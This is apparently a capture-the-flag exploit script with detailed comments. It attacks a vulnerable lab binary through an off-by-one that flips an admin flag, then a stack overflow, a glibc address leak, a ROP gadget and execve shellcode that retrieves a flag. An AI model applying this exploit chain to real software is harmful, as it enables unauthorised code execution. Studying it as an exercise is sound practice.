#!/usr/bin/python3

import sys
import socket
import time

#NOTE: relevant non-boilerplate code starts at line 77

#assign host and port to connect to
if len(sys.argv) >= 3:
    host = sys.argv[1]
    port = int(sys.argv[2])
else:
    host = "hacky1"
    port = 13702

s = socket.socket()
s.connect((host, port))


#functions to communicate with server (based on funtions from qual.py)
def dbg_print(txt):
    debug = False
    if debug:
        print(txt.decode('utf-8'))

def recv_until_timed(delim, timeout):
    global s
    if type(delim) is not bytes:
        delim = delim.encode('utf-8')
    tmp = b''
    starttime = time.time()
    if timeout <= 0:
        timeout = float('inf')
    while delim not in tmp and (time.time() - starttime) <= timeout:
            try:
                    r = s.recv(1)
                    if not r:
                            dbg_print(tmp)
                            return tmp
                    tmp += r
            except InterruptedError:
                    pass
    dbg_print(tmp)
    return tmp

def recv_until(delim):
    return recv_until_timed(delim, 0)

def recv_cnt_timed(count, timeout):
    global s
    tmp = b''
    starttime = time.time()
    if timeout <= 0:
        timeout = float('inf')
    while len(tmp) < count and (time.time() - starttime) <= timeout:
            try:
                    r = s.recv(1)
                    if not r:
                            dbg_print(tmp)
                            return tmp
                    tmp += r
            except InterruptedError:
                    pass
    dbg_print(tmp)
    return tmp

def recv_cnt(count):
    return recv_cnt_timed(count, 0)

def send(b):
    if type(b) is not bytes:
        b = b.encode('utf-8')
    s.send(b)


# In line 21 of vuln.c up to 40 bytes are read into a buffer of size 40 using scanf("%40s", buf);
# On the stack char buf[40] starts at offset 0x38, followed by long is_admin at offset 0x10.
# If 40 non-zero not equal to '\n' are entered, scanf fills the buffer with those bytes.
# No NULL byte is added at the end.
# strlen(buf) returns the length of a NULL-terminated string, excluding the NULL-Byte.
# Since no '\0' has been added but is_admin is initialized with 0, the lowest byte of is_admin
#   is counted as the NULL byte, so 40 is returned.
# Since the string wasn't terminated with '\n', the if condition in line 21 triggers.
# strcat(buf, "\n") concatenates two NULL-terminated strings, storing them in the first argument.
# No length restrictions are checked here. The man page states: 
#   "The programmer is responsible for allocating a destination buffer large enough"
# Since the buffer is full and the byte considered the terminating NULL character already lies 
#   outside the buffer within is_admin, the lowest byte of is_admin is overwritten with 0x0A ('\n')
# This causes if(!is_admin) in line 32 to be skipped.
send(40*b"\xFF")
recv_until('\n')

# the offset of buf[40] within the stackframe of main() (relative to the return address)
stack_offset_buf = 0x38

# We will be able to determine the address of the glibc function funlockfile(...)
# Since no position independent code stuff is enabled, we will be able to calculate the addresses
#   of other functions (and ROP Gadgets) within glibc, if we know their offset within the glibc 
#   binary used on the server.
# The following offsets have been determined using libc-2.31.so
# 
# offset of the funlockfile(...) function
glibc_offset_funlockfile = 0x0000000000055090
# offset of two bytes 0x54 0xc3 corresponding to the assembly instructions 'push rsp; ret;'
glibc_offset_ropgadget =   0x0000000000037fc9

# Address of a call to the puts(...) that corresponds to printf("\x1b[32mHey admin!\x1b[0m\n")
# Note that the address points to the actual call AFTER the rdi register has been set
# Since puts expects its argument in rdi, we can use this address in a ROP like manner, 
#   to print any data located at the memory address contained in rdi, until 0x00 is encountered
# In combination with a 'pop rdi; ret;' gadget this can be used to explore arbitrary memory
#   locations (which we did during the exploration phase of writing this exploit), but luckily
#   the memory address contained in rdi after we reach the end of main is already useful in
#   this case, as it contains the address of the glibc function funlockfile(...)
fn_call_puts = b"\xb9\x12\x40\x00\x00\x00\x00\x00"

# scanf("%s", buf) in line 39 of vuln.c can be used to write an arbitrary amount of data to buf
#   triggering a buffer overflow that can be used to overwrite the return address of main
# By writing 0x38 arbitrary bytes followed by fn_call_puts, we can use this ROP gadget to 
#   print and extract the memory address of funlockfile and calculate the address of our
#   'push rsp; ret;' gadget to the stack
# Additionally this causes scanf("%s", buf) to be called once more, allowing us to trigger the 
#   newly obtained ROP gadget
# Technically we could have hardcoded the address once discovered, since ASLR and similar techniques 
#   are all disabled on hacky1, but since we used this technique to figure out the location of the 
#   stack in the first place, we figured we may as well keep using it in the exploit
send(stack_offset_buf*b"\x00" + fn_call_puts + b"\n")
glibc_addr_funlockfile = int.from_bytes(recv_until('\n')[16:22], byteorder='little')
glibc_addr_ropgadget = glibc_addr_funlockfile - glibc_offset_funlockfile + glibc_offset_ropgadget

# Finally we are able to set rip to the stack pointer using the gadget mentioned above
# So all that is left to do is write up some code that executes execve("/bin/get_flag") and
#   place it on the stack at the location pointed to by rsp, once again using stack_offset_buf
#
#  0: 48 31 d2                xor    rdx,rdx    # delete rdx (3rd argument)
#  3: 48 31 f6                xor    rsi,rsi    # delete rsi (2nd argument)
#  6: 54                      push   rsp        # use stack pointer to calculate address of
#  7: 5f                      pop    rdi        #   2nd argument (path to binary to execute)
#  8: 48 83 c7 15             add    rdi,0x15   # add offset of string b"/bin/get_flag\x00"
#  c: 48 c7 c0 3b 00 00 00    mov    rax,0x3b   # id of execve syscall
# 13: 0f 05                   syscall           # execute syscall
#
# followed by b"/bin/get_flag\x00"
#
shellcode = b"\x48\x31\xD2\x48\x31\xF6\x54\x5F\x48\x83\xC7\x15\x48\xC7\xC0\x3B\x00\x00\x00\x0F\x05"
flag_binary = b"/bin/get_flag\x00"

exploit = 0x38*b"\x00" + glibc_addr_ropgadget.to_bytes(8, 'little') + shellcode + flag_binary + b"\n"

# Send exploit and print response (flag)
send(exploit)
print(recv_until('\n').decode())

